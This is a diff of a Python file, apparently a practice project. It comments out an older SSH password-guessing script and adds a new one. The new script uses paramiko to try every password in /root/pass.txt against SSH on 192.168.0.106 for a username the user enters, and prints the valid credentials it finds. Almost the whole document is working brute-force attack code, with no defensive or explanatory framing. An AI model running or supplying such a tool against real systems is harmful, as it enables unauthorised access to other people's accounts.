@@ -85,7 +85,7 @@ with open(password_file, 'r') as file:
 input_file.close()
 """
 
-#!/usr/bin/env python3
+"""#!/usr/bin/env python3
 import socket
 import paramiko
 ip=input("Please enter your target IP: ")
@@ -113,4 +113,32 @@ for wordpass in file.readlines():
     elif attempt == 2:
         print("Network Error")
         exit()
-file.close()
+file.close()"""
+
+
+#!/usr/bin/python3
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+import paramiko
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+username=input("Please enter username: ")
+f = open("/root/pass.txt", "r")
+for line in f:
+    wordpass=line.strip("\n")
+    try:
+        client.connect('192.168.0.106',22, username=username, password=wordpass)
+        print(bcolors.OKGREEN,"Found Valid Credentials: ", username,":", wordpass)
+        client.close()
+    except paramiko.ssh_exception.AuthenticationException:
+        print(bcolors.FAIL ,"Failed Login: ",username,":",wordpass)
+        client.close()
+f.close()
